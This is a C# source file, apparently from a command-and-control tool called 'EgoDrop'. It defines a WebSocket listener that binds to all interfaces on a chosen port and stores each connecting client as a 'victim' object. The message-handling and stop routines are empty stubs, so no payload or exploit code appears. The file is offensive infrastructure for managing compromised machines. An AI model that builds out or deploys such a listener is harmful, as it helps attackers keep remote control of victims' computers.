using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Fleck;

namespace EgoDrop
{
    internal class clsHttpListener : clsListener
    {
        private WebSocketServer m_webSrv { get; set; }
        public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();

        public delegate void OnOpenedHandler(IWebSocketConnection sktClnt, string szClntAddr, string szMsg);
        public delegate void OnClosedHandler(IWebSocketConnection sktClnt, string szClntAddr, string szMsg);

        public delegate void NewLogsEventHandler(string szID, string szMsg);
        public delegate void MessageEventHandler(string szID, string szMsg);

        private OnOpenedHandler m_fnOnOpened { get; set; }
        private OnClosedHandler m_fnOnClosed { get; set; }

        public clsHttpListener(string szName, int nPort, bool bSecure, string szDescription, OnOpenedHandler fnOnOpened, OnClosedHandler fnOnClosed)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_Protocol = clsSqlite.enListenerProtocol.HTTP;
            m_stListener = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szDescription, DateTime.Now);

            m_webSrv = new WebSocketServer($"ws://0.0.0.0:{m_nPort}");

            m_fnOnOpened = fnOnOpened;
            m_fnOnClosed = fnOnClosed;
        }

        public override void fnStart()
        {
            //base.fnStart();

            FleckLog.Level = LogLevel.Debug;
            if (m_webSrv == null)
                return;

            m_webSrv.Start(sktClnt =>
            {
                string szHost = $"{sktClnt.ConnectionInfo.ClientIpAddress}:{sktClnt.ConnectionInfo.ClientPort}";
                sktClnt.OnOpen = () =>
                {
                    m_dicVictim.Add(szHost, new clsVictim(sktClnt, this));
                };

                sktClnt.OnClose = () =>
                {
                    m_dicVictim.Remove(szHost);
                };

                sktClnt.OnMessage = szMsg =>
                {

                };
            });
        }

        public override void fnStop()
        {
            //base.fnStop();


        }
    }
}
